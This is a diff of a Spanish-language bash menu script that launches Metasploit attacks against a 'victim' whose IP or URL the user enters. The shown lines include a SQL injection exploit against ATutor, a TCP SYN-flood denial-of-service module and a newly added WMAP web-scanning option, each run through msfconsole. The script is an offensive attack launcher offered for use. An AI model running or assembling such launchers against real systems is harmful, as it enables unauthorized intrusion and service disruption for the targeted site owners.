@@ -51,13 +51,13 @@ echo -e "\e[1;31m Que deseas que haga ?\e[0m"
 
 echo -e "\e[1;34m   [1]\e[0m \e[1;34mSQL INJECTION\e[0m"
 echo -e "\e[1;34m   [2]\e[0m \e[1;34mDOS ATACK\e[0m"
-echo -e "\e[1;34m   [3]\e[0m \e[1;34mSALIR\e[0m"
+echo -e "\e[1;34m   [3]\e[0m \e[1;34mANALISIS WEB\e[0m"
+echo -e "\e[1;34m   [4]\e[0m \e[1;34mSALIR\e[0m"
 read opcion
 case $opcion in 
 
-
-
 1)
+
 sleep 2.5s 
 echo -n -e "\e[1;34mDIRECCION IP DE LA WEB DE LA VICTIMA :\e[0m"
 read IP
@@ -74,6 +74,7 @@ msfconsole -x "exploit/multi/http/atutor_sqli;\
 read enterkey
 ;;
 2)
+
 sleep 2.5s 
 echo -n -e "\e[1;34mDIRECCION IP DE LA VICTIMA :\e[0m"
 read IP
@@ -90,11 +91,33 @@ msfconsole -x "use /auxiliary/dos/tcp/synflood;\
 read enterkey
 ;;
 3)
+
+sleep 2.5s 
+echo -n -e "\e[1;34mAÑADE EL SITIO WEB DE LA VICTIMA:\e[0m"
+read IP
+sleep 1s 
+echo -n -e "\e[1;34mFIJAMOS EL LA WEB (url de la victima):\e[0m"
+read IP2
+sleep 1s 
+sudo service postgresql start
+sleep 1s 
+clear
+sleep 2s
+msfconsole -x "load wmap;\
+               wmap_sites -a $IP
+               wmap_targets -d $IP2
+               wmap_run -e"
+
+read enterkey
+;;
+4)
+
 clear
 exit 0
 read enterkey
 ;;
 *)
+
 clear
 echo -e "\e[1;31mNo puedo cumplir esa accion porque no me la ha enseñado mi cresdor\e[0m"
 
